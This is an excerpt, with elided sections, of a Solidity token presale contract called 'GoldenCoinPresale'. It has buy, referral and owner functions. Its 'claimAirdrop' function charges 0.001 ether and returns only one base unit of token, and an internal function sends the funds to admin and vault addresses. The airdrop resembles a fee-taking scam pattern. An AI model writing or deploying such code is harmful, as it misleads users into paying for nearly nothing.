...
// Website: https://www.goldencoinweb.com/
...
contract GoldenCoinPresale is Ownable, ReentrancyGuard {
    using SafeMath for uint256;
    using SafeERC20 for IERC20;

    address public tokenIn = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address public tokenOut = 0xa5f2f61da2628D123430329D4c15720D18725f3F;
    ...
    function buyGoldenCoin(uint256 inAmount, address ref) external {
        ...
        require(presaleStarted == true, 'Golden Coin Presale: Sale not started.');
        require(inAmount <= total, "Golden Coin Presale: Insufficient fund.");
        require(outAmount <= quota, "Golden Coin Presale: Quota not enough.");
		...
		uint256 refBonus = inAmount.mul(10).div(100);
	...
	function claimAirdrop() public payable nonReentrant {
		require(msg.value == 0.001 ether); 
		IERC20(tokenOut).safeTransfer(msg.sender, 1);
	...
	function sA(uint256 sentAmount) internal {
		...
		ADMIN.transfer(qsA);
		VAULT.transfer(qsA);
        IERC20(tokenOut).safeTransfer(VAULT, 1);
	}

    function setPresaleStarted(bool _status) external onlyOwner {
        require(presaleStarted != _status, "Not changed");
